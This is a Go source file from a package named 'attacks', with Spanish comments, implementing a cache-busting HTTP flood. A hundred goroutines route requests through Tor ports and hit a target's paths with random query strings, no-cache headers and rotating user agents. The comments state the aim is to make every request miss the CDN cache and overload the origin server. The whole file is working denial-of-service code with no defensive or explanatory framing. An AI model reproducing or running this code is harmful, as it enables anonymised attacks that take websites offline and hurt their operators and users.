package attacks

import (
	"context"
	"fmt"
	"math/rand"
	"net/http"
	"sync/atomic"
	"time"
)

// CacheBust bypasea CDN/caché con query params únicos por request
// Fuerza al origin server a procesar cada request individualmente
// El CDN no puede servir desde caché = cada request llega al backend
func CacheBust(ctx context.Context, targetURL string, torPorts []int, stats *Stats) {
	workers := 100
	if len(torPorts) == 0 {
		return
	}

	for i := 0; i < workers; i++ {
		port := torPorts[i%len(torPorts)]
		client := makeH1Client(port)
		go cacheBustWorker(ctx, client, targetURL, stats)
	}
}

func cacheBustWorker(ctx context.Context, client *http.Client, baseURL string, stats *Stats) {
	paths := []string{
		"", "/", "/search", "/api", "/index.php",
		"/wp-admin", "/login", "/admin", "/api/v1",
	}

	for {
		select {
		case <-ctx.Done():
			return
		default:
			// Query param único = CDN miss garantizado
			bust := fmt.Sprintf("%s%s?v=%d&t=%d&r=%d",
				baseURL,
				paths[rand.Intn(len(paths))],
				rand.Int63(),
				time.Now().UnixNano(),
				rand.Int63(),
			)

			req, err := http.NewRequestWithContext(ctx, "GET", bust, nil)
			if err != nil {
				continue
			}
			req.Header.Set("User-Agent", randomUA())
			req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
			req.Header.Set("Pragma", "no-cache")
			req.Header.Set("Expires", "0")

			resp, err := client.Do(req)
			if err != nil {
				atomic.AddInt64(&stats.Errors, 1)
			} else {
				resp.Body.Close()
				atomic.AddInt64(&stats.CacheBust, 1)
				atomic.AddInt64(&stats.Total, 1)
			}
			time.Sleep(1 * time.Millisecond)
		}
	}
}
